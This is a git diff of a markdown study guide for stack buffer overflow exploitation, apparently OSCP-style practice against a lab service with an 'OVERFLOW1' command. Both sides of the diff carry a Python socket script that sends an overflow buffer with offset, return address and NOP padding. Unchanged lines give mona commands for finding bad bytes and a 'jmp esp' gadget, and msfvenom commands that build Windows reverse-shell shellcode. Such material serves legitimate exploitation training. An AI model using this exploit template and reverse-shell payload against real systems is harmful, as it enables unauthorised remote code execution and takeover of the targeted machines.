@@ -91,20 +91,20 @@ port = 1337
 
 offset = 1978
 
-buffer  = b""
-buffer += b"OVERFLOW1 " # prefix
-buffer += b"1" * offset # overflow
-buffer += b"2222" # return
-buffer += b"\x90"*16 # padding
-buffer += b"" # payload
-buffer += b"" # postfix
+buf  = b""
+buf += b"OVERFLOW1 " # prefix
+buf += b"1" * offset # overflow
+buf += b"2222" # return
+buf += b"\x90"*16 # padding
+buf += b"" # payload
+buf += b"" # postfix
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
     s.connect((ip, port))
     print("Sending buffer...")
-    s.send(buffer + b"\r\n")
+    s.send(buf + b"\r\n")
     print("Done!")
 except:
     print("Could not connect.")
@@ -121,11 +121,11 @@ for x in range(1, 256):
 print()
 ```
 
-`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`
+`!mona compare -f .\bytearray.bin -a <address>`
 
 ## Finding the right module
 
-You can list modules with `!mona modules` command, and find unsecured module.
+You can list modules with `!mona modules` command, and find unsecure module.
 
 Then try to find position of `jmp esp` instruction\(`FF E4`\)
 
@@ -137,16 +137,14 @@ Then try to find position of `jmp esp` instruction\(`FF E4`\)
 
 ## Generating shellcode
 
-Generating shellcode with msfvenom is easy.
-
 ```bash
 msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> EXITFUNC=thread -f c -a <architecture> -b <bad_bytes>
+
+msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x00" -f py
 
 # example
 msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8990 EXITFUNC=thread -f c -a x86 -b "\x00"
 ```
 
 ## Root
-
-Setup your listener, run the exploit, profit.
 
